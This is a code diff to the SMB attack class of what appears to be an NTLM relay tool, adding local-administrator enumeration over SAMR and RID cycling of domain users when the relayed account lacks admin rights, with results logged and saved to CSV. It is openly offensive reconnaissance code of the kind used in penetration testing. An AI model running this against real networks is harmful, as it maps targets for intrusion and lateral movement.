@@ -25,6 +25,12 @@ from smbclient import MiniImpacketShell
 
 PROTOCOL_ATTACK_CLASS = "SMBAttack"
 
+#Define global variables to prevent RID cycling more than once
+ridCycleDone = False
+
+#Define global localAdminMap
+localAdminMap = {}
+
 class SMBAttack(ProtocolAttack):
     """
     This is the SMB default attack class.
@@ -49,6 +55,16 @@ class SMBAttack(ProtocolAttack):
 
     def __answer(self, data):
         self.__answerTMP += data
+
+    def __updateAdminMap(self, adminNames):
+        global localAdminMap
+        hostname = self.__SMBConnection.getRemoteHost()
+        for name in adminNames:
+            if name in localAdminMap:
+                localAdminMap[name].append(hostname)
+            else:
+                localAdminMap[name] = [hostname]
+        return
 
     def run(self):
         # Here PUT YOUR CODE!
@@ -78,7 +94,35 @@ class SMBAttack(ProtocolAttack):
                 remoteOps  = RemoteOperations(self.__SMBConnection, False)
                 remoteOps.enableRegistry()
             except Exception, e:
-                # Something went wrong, most probably we don't have access as admin. aborting
+                if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
+                    if self.config.enumLocalAdmins:
+                        logging.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost()))
+                        enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
+                        try:
+                            localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
+                            self.__updateAdminMap(localAdminNames)
+                            logging.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost()))
+                            for name in localAdminNames:
+                                logging.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost(), name))
+                        except DCERPCException, e:
+                            logging.info("SAMR access denied")
+                    
+                    if self.config.ridCycle and not ridCycleDone:
+                        logging.info("Relayed user doesn't have admin on {}. Performing RID cycling to enumerate domain users".format(self.__SMBConnection.getRemoteHost())) 
+                        ridCycle = RidCycle(self.__SMBConnection)
+                        domainSids = ridCycle.getDomainSIDs(self.config.ridMax)
+                        logging.info("Performed RID cycle from host {}. Enumerated {} domain SIDs".format(self.__SMBConnection.getRemoteHost(), len(domainSids)))
+                        filename = "{}_domainSids.csv".format(self.__SMBConnection.getRemoteHost())
+                        with open(filename, 'w') as fp:
+                            fp.write("SID, Name, Type\n")
+                            fp.write("\n".join(domainSids))
+                        logging.info("{} written with results".format(filename))
+                        ridCycleDone = True
+                    elif self.config.ridCycle and ridCycleDone:
+                        logging.info("RID Cycle already performed")
+
+                    return
+                # Something else went wrong. aborting
                 LOG.error(str(e))
                 return
 
